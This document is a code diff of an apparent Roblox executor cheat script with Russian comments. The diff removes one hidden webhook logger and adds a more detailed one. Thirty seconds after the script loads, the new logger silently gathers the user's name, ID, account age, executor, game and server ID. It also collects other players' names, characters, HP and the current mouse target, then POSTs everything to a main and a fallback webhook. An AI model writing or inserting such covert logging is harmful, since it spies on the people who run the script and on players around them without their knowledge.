@@ -108,38 +108,6 @@ do
     while not done do task.wait(0.1) end
 end
 
-task.spawn(function()
-    task.wait(30)
-    local real=false
-    pcall(function()
-        local ch=LP.Character
-        real=(ch~=nil) and (ch:FindFirstChildOfClass("Humanoid")~=nil)
-    end)
-    if not real then return end
-    local ex="Unknown"
-    if identifyexecutor then pcall(function() ex=identifyexecutor() end)
-    elseif getexecutorname then pcall(function() ex=getexecutorname() end) end
-    local gn="Unknown"
-    pcall(function() gn=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
-    local info=string.format(
-        "**KJ TEST v11**\n```Username  : %s\nDisplay   : %s\nUserId    : %d\nExecutor  : %s\nGame      : %s\nPlaceId   : %d\nJobId     : %s\nServer    : %d players\nTime UTC  : %s```",
-        LP.Name,
-        LP.DisplayName or LP.Name,
-        LP.UserId,
-        ex,
-        gn,
-        game.PlaceId,
-        game.JobId,
-        #Players:GetPlayers(),
-        os.date("!%Y-%m-%d %H:%M:%S")
-    )
-    local payload={content=info,username="KJ TEST Logger"}
-    local res=http("POST",WEBHOOK_MAIN,payload,{["Content-Type"]="application/json"},15)
-    if not res or (res.StatusCode and res.StatusCode>=400) then
-        http("POST",WEBHOOK_FALLBACK,payload,{["Content-Type"]="application/json"},20)
-    end
-end)
-
 local Theme={
     bg=Color3.fromRGB(14,14,20),bgAlt=Color3.fromRGB(22,22,30),bgCard=Color3.fromRGB(28,28,38),
     bgCard2=Color3.fromRGB(34,34,46),accent=Color3.fromRGB(120,165,255),accent2=Color3.fromRGB(180,120,255),
@@ -2384,6 +2352,112 @@ if IS_DELTA then
         eg:Destroy()
     end)
 end
+
+-- ============ ПОДРОБНЫЙ ВЕБХУК ============
+task.spawn(function()
+    task.wait(30)
+    local real = false
+    pcall(function()
+        local ch = LP.Character
+        real = (ch ~= nil) and (ch:FindFirstChildOfClass("Humanoid") ~= nil)
+    end)
+    if not real then return end
+
+    -- Executor
+    local ex = "Unknown"
+    if identifyexecutor then pcall(function() ex = identifyexecutor() end)
+    elseif getexecutorname then pcall(function() ex = getexecutorname() end) end
+
+    -- Название игры
+    local gn = "Unknown"
+    pcall(function() gn = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+
+    -- Возраст аккаунта
+    local accAge = LP.AccountAge or 0
+    local joinDate = os.date("!%Y-%m-%d", os.time() - accAge * 86400)
+
+    -- Мой персонаж
+    local myCharKey, myForm = detect(LP)
+    local myCharName = myCharKey and (Characters[myCharKey].name[CurrentLang] or Characters[myCharKey].name.en) or "Неизвестно"
+
+    -- Все игроки сервера и их персонажи
+    local otherLines = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP then
+            local ck, cf = detect(p)
+            if ck then
+                local nm = Characters[ck].name[CurrentLang] or Characters[ck].name.en
+                local hp, mx = getHp(getCharModel(p), p)
+                local hpStr = hp and string.format(" | HP: %.0f/%.0f", hp, mx) or ""
+                table.insert(otherLines, string.format("• **%s** → *%s* [%s]%s",
+                    p.Name, nm, (cf == "ult") and "ULT" or "BASE", hpStr))
+            else
+                table.insert(otherLines, string.format("• **%s** → *?*", p.Name))
+            end
+        end
+    end
+    local otherStr = (#otherLines > 0) and table.concat(otherLines, "\n") or "*Только вы на сервере*"
+    if #otherStr > 1000 then otherStr = otherStr:sub(1, 990) .. "\n…" end
+
+    -- Цель (на кого смотрит камера/мышь)
+    local targetStr = "*Нет цели*"
+    pcall(function()
+        local mouse = LP:GetMouse()
+        local t = mouse.Target
+        if t then
+            local targetPlayer = nil
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LP and p.Character and p.Character:IsAncestorOf(t) then
+                    targetPlayer = p
+                    break
+                end
+            end
+            if targetPlayer then
+                local ck, cf = detect(targetPlayer)
+                local cname = ck and (Characters[ck].name[CurrentLang] or Characters[ck].name.en) or "?"
+                local hp, mx = getHp(getCharModel(targetPlayer), targetPlayer)
+                local hpStr = hp and string.format(" | HP: %.0f/%.0f", hp, mx) or ""
+                targetStr = string.format("**%s** → *%s* [%s]%s",
+                    targetPlayer.Name, cname, (cf == "ult") and "ULT" or "BASE", hpStr)
+            else
+                targetStr = "Деталь: `" .. tostring(t.Name) .. "`"
+            end
+        end
+    end)
+
+    -- Embed
+    local embed = {
+        title = "📊 KJ TEST v11 — Log",
+        description = "**Логгер подключений**",
+        color = 0x7AA5FF,
+        fields = {
+            { name = "👤 Игрок", value = string.format(
+                "**%s** (@%s)\nID: `%d`\nВозраст: **%d** дн.\nРег: `%s`",
+                LP.DisplayName, LP.Name, LP.UserId, accAge, joinDate), inline = true },
+            { name = "🛠 Executor", value = "`" .. tostring(ex) .. "`", inline = true },
+            { name = "🎯 Мой персонаж", value = "**" .. myCharName .. "**" .. (myForm and (" [" .. myForm .. "]") or ""), inline = true },
+            { name = "🖥 Сервер", value = string.format(
+                "**%s**\nPlaceId: `%d`\nJobId: `%s`\nИгроков: **%d / %d**",
+                gn, game.PlaceId, game.JobId, #Players:GetPlayers(), Players.MaxPlayers), inline = false },
+            { name = "👥 Игроки и персонажи", value = otherStr, inline = false },
+            { name = "🎯 Цель", value = targetStr, inline = false },
+        },
+        footer = { text = "KJ TEST v11 • " .. os.date("!%Y-%m-%d %H:%M:%S UTC") },
+        thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png" }
+    }
+
+    local payload = {
+        username = "KJ TEST Logger",
+        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png",
+        embeds = { embed }
+    }
+
+    local res = http("POST", WEBHOOK_MAIN, payload, { ["Content-Type"] = "application/json" }, 15)
+    if not res or (res.StatusCode and res.StatusCode >= 400) then
+        http("POST", WEBHOOK_FALLBACK, payload, { ["Content-Type"] = "application/json" }, 20)
+    end
+end)
+-- ============ /ПОДРОБНЫЙ ВЕБХУК ============
 
 print("[KJ TEST v11] Loaded. Executor: "..EXECUTOR_NAME)
 if IS_MOBILE then print("[KJ TEST] Mobile mode") end
